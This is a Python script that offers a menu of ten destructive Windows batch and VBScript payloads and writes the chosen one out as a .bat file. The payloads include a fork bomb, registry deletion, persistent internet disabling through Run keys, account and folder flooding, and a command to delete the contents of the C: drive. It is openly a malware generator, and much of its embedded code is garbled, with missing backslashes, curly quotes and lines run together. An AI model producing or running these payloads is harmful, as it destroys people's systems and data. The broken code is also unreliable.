

import os
import time
import convertor
from prettytable import PrettyTable
import platform
##############################################################################
#colour 
RED='\033[31m'
BLUE='\033[34m'
RE='\033[0m'
YELLOW='\033[93m'
GREEN='\033[32m'

##############################################################################
#table
table=PrettyTable(['Id','Name','Function','Level'])
table.add_row(['1','Disable Internet Permanently','This code will disable the internet connectivity permanently',RED+'Medium risk'+RE])
table.add_row(['2','Delete Key Registry Files','This will delete key registry files, then loops a message',RED+'High risk'+RE])
table.add_row(['3','Endless Notepads','This will pop up endless notepads until the computer freezes and crashes',BLUE+'Medium risk'+RE])
table.add_row(['4','Popping CD Drives','This will make the CD drives constantly pop out',YELLOW+'low risk'+RE])
table.add_row(['5','Endless Enter','This will make the enter button pressed continuously',BLUE+'Medium risk'+RE])
table.add_row(['6','Application Bomber','It will start to open different applications repeatedly ',BLUE+'Medium risk'+RE])
table.add_row(['7','Folder Flooder','This will create unlimited no. of folders.',BLUE+'Medium risk'+RE])
table.add_row(['8','User Account Flooder','This will create large no. of the user account ',BLUE+'Medium risk'+RE])
table.add_row(['9','Process Creator','This will create unlimited background processes',BLUE+'Medium risk'+RE])
table.add_row(['10','Windows Destroyer','This will delete your whole C:\ drive and it really unrecoverable',RED+'High risk'+RE])
#################################################################################
#operting system finder
sys=platform.system()
if sys == "Windows":
    cmd='cls'
elif sys == "Linux":
    cmd='clear'
#################################################################################
#getting id
try:
    while True:
        print(table)
        print(RED+" Press Ctrl+c exit from script"+RE)
        id=input(GREEN+"Enter The Id You Want:"+RE)
        if id=="1":
            code ='''
echo @echo off>c:windowswimn32.bat        
echo break off>c:windowswimn32.bat echo
ipconfig/release_all>c:windowswimn32.bat
echo end>c:windowswimn32.batreg add
hkey_local_machinesoftwaremicrosoftwindowscurrentversionrun /v WINDOWsAPI /t reg_sz /d c:windowswimn32.bat /freg add
hkey_current_usersoftwaremicrosoftwindowscurrentversionrun /v CONTROLexit /t reg_sz /d c:windowswimn32.bat /fecho You Have Been HACKED!
'''
            name="Internet Disabler"
        elif id=="2":
            code='''
@ECHO OFF
 START reg delete HKCR/.exe
 START reg delete HKCR/.dll
 START reg delete HKCR/*
 :MESSAGE
 ECHO Your PC has been crashed.Your Dad.
 GOTO MESSAGE
'''
            name="Registry Deleter"
        elif id=="3":
            code='''
@ECHO off
 :top
 START %SystemRoot%\system32\notepad.exe
 GOTO top
'''
            name="Endless Notepads"
        elif id=="4":
            code='''
Set oWMP = CreateObject(”WMPlayer.OCX.7″)
 Set colCDROMs = oWMP.cdromCollection
 do
 if colCDROMs.Count >= 1 then
 For i = 0 to colCDROMs.Count – 1
 colCDROMs.Item(i).Eject
 Next
 For i = 0 to colCDROMs.Count – 1
 colCDROMs.Item(i).Eject
 Next
 End If
 wscript.sleep 100
 loop
'''
            name="Popping CD Drives"
        elif id=="5":
            code='''
Set wshShell = wscript.CreateObject(”WScript.Shell”)
 do
 wscript.sleep 100
 wshshell.sendkeys “~(enter)”
 loop
 '''
            name="Endless Enter"
        elif id=="6":
            code='''
@echo off
 :x
 start winword
 start mspaint
 start notepad
 start write
 start cmd
 start explorer
 start control
 start calc
 goto x
'''
            name="Application Bomber"
        elif id=="7":
            code='''
@echo off
:x
md %random%
/folder.
goto x
 '''
            name="Folder Flooder"
        elif id=="8":
            code='''
@echo off
:xnet
user %random% /add
goto x
'''
            name="User Account Flooder"
        elif id=="9":
            code='''
%0|%0   
'''
            name="Process Creator"
        elif id=="10":
            code='''
@Echo off
Del C:\ *.* |y
'''
            name="Windows Destroyer"
            print(id)
           
        else:
            print("Invaild Id")
            exit()
        convertor.convert(name,code)
        time.sleep(2)
        check=os.path.exists(name+'.bat')
        time.sleep(1)
        if check == True:
            print("successful")
        elif check == False:
            print("failed")
        time.sleep(1)
        input(RED+'Press Enter to reload the script'+RE)
        time.sleep(1)
        os.system(cmd)
except Exception:
    print(RED+"Something Went Wrong"+RE)
